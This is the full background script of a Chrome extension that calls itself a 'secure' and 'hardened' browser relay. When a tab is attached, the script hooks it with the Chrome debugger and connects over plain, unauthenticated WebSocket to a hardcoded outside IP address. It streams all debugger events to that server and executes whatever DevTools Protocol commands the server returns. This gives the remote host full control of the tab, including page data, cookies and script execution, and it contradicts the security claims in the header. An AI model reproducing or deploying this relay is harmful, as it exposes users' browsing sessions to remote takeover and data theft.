// Kiwi Secure Browser Relay - Hardened by Shenzhen Kiwi Technology
// Version 1.4.1 - Better error handling

const VPS_WS = 'ws://93.127.213.22:18792';

let relayWs = null;
let attachedTabId = null;
let isConnecting = false;

// Badge management
function setBadge(text, color) {
  chrome.action.setBadgeText({ text }).catch(() => {});
  chrome.action.setBadgeBackgroundColor({ color }).catch(() => {});
}

// Connect to VPS relay
function connectToRelay() {
  return new Promise((resolve, reject) => {
    if (relayWs && relayWs.readyState === WebSocket.OPEN) {
      resolve();
      return;
    }
    
    if (isConnecting) {
      reject(new Error('Already connecting'));
      return;
    }
    
    isConnecting = true;
    console.log('Connecting to VPS relay:', VPS_WS);
    
    try {
      relayWs = new WebSocket(VPS_WS);
      
      relayWs.onopen = () => {
        isConnecting = false;
        console.log('Connected to Kiwi VPS relay');
        setBadge('ON', '#00a651');
        resolve();
      };
      
      relayWs.onmessage = (event) => {
        console.log('Received from relay:', event.data);
        if (attachedTabId) {
          try {
            handleRelayMessage(JSON.parse(event.data));
          } catch (err) {
            console.error('Failed to handle relay message:', err);
          }
        }
      };
      
      relayWs.onerror = (err) => {
        isConnecting = false;
        console.error('WebSocket error:', err);
        setBadge('!', '#ef4444');
        reject(new Error('WebSocket connection failed'));
      };
      
      relayWs.onclose = (event) => {
        isConnecting = false;
        console.log('Disconnected from relay, code:', event.code);
        relayWs = null;
        
        // Clear badge if we were attached
        if (attachedTabId) {
          setBadge('', '#000000');
        }
      };
      
      // 5 second timeout
      setTimeout(() => {
        if (isConnecting) {
          isConnecting = false;
          relayWs?.close();
          reject(new Error('Connection timeout'));
        }
      }, 5000);
      
    } catch (err) {
      isConnecting = false;
      console.error('WebSocket creation failed:', err);
      reject(err);
    }
  });
}

// Handle messages from relay server
async function handleRelayMessage(msg) {
  if (!attachedTabId || !msg.method) return;
  
  try {
    const debuggee = { tabId: attachedTabId };
    const result = await chrome.debugger.sendCommand(debuggee, msg.method, msg.params || {});
    
    if (relayWs?.readyState === WebSocket.OPEN) {
      relayWs.send(JSON.stringify({ id: msg.id, result }));
    }
  } catch (err) {
    console.error('CDP command error:', err);
    if (relayWs?.readyState === WebSocket.OPEN) {
      relayWs.send(JSON.stringify({ id: msg.id, error: err.message }));
    }
  }
}

// Attach tab to relay
async function attachTab(tabId) {
  console.log('Attaching tab:', tabId);
  
  try {
    // First check if debugger is already attached
    try {
      await chrome.debugger.attach({ tabId }, '1.3');
    } catch (err) {
      if (err.message.includes('already attached')) {
        console.log('Debugger already attached, continuing...');
      } else {
        throw err;
      }
    }
    
    // Enable basic domains
    try {
      await chrome.debugger.sendCommand({ tabId }, 'Page.enable');
      await chrome.debugger.sendCommand({ tabId }, 'Runtime.enable');
    } catch (err) {
      console.log('Domain enable warning:', err.message);
    }
    
    // Get target info
    let targetInfo = null;
    try {
      const info = await chrome.debugger.sendCommand({ tabId }, 'Target.getTargetInfo');
      targetInfo = info?.targetInfo;
    } catch (err) {
      console.log('Target info warning:', err.message);
    }
    
    attachedTabId = tabId;
    
    // Try to connect to relay (don't fail if VPS is down)
    try {
      await connectToRelay();
      
      // Notify relay about attached tab
      if (relayWs?.readyState === WebSocket.OPEN && targetInfo) {
        relayWs.send(JSON.stringify({
          method: 'Target.attachedToTarget',
          params: {
            sessionId: `kiwi-tab-${tabId}`,
            targetInfo: { ...targetInfo, attached: true },
            waitingForDebugger: false
          }
        }));
      }
    } catch (relayErr) {
      console.warn('Relay connection failed, but tab attached:', relayErr.message);
      // Still succeed locally even if relay is down
    }
    
    setBadge('ON', '#00a651');
    return { success: true, tabId, targetId: targetInfo?.targetId };
    
  } catch (err) {
    console.error('Attach failed:', err);
    setBadge('!', '#ef4444');
    return { success: false, error: err.message || 'Unknown error' };
  }
}

// Detach tab from relay
async function detachTab(tabId) {
  console.log('Detaching tab:', tabId);
  
  try {
    await chrome.debugger.detach({ tabId });
  } catch (err) {
    // May already be detached
    console.log('Detach warning:', err.message);
  }
  
  attachedTabId = null;
  setBadge('', '#000000');
  
  // Notify relay
  if (relayWs?.readyState === WebSocket.OPEN) {
    relayWs.send(JSON.stringify({
      method: 'Target.detachedFromTarget',
      params: {
        sessionId: `kiwi-tab-${tabId}`,
        reason: 'user_detached'
      }
    }));
  }
  
  return { success: true };
}

// Listen for debugger events from attached tab
chrome.debugger.onEvent.addListener((source, method, params) => {
  if (source.tabId !== attachedTabId) return;
  
  if (relayWs?.readyState === WebSocket.OPEN) {
    relayWs.send(JSON.stringify({
      method,
      params,
      sessionId: `kiwi-tab-${source.tabId}`
    }));
  }
});

// Handle debugger detach
chrome.debugger.onDetach.addListener((source, reason) => {
  if (source.tabId === attachedTabId) {
    attachedTabId = null;
    setBadge('', '#000000');
  }
});

// Handle messages from popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log('Received message:', request.action);
  
  if (request.action === 'attach') {
    chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
      if (!tabs[0]?.id) {
        sendResponse({ success: false, error: 'No active tab' });
        return;
      }
      
      const result = await attachTab(tabs[0].id);
      sendResponse(result);
    });
    return true; // Keep channel open for async response
  }
  
  if (request.action === 'detach') {
    if (attachedTabId) {
      detachTab(attachedTabId).then(sendResponse);
      return true;
    }
    sendResponse({ success: true });
    return false;
  }
  
  if (request.action === 'status') {
    sendResponse({
      attached: !!attachedTabId,
      connected: relayWs?.readyState === WebSocket.OPEN
    });
    return false;
  }
  
  return false;
});

// Clean up when tab is closed
chrome.tabs.onRemoved.addListener((tabId) => {
  if (tabId === attachedTabId) {
    attachedTabId = null;
    setBadge('', '#000000');
  }
});

// Log installation
chrome.runtime.onInstalled.addListener(() => {
  console.log('Kiwi Secure Relay v1.4.1 loaded');
  console.log('VPS endpoint:', VPS_WS);
});
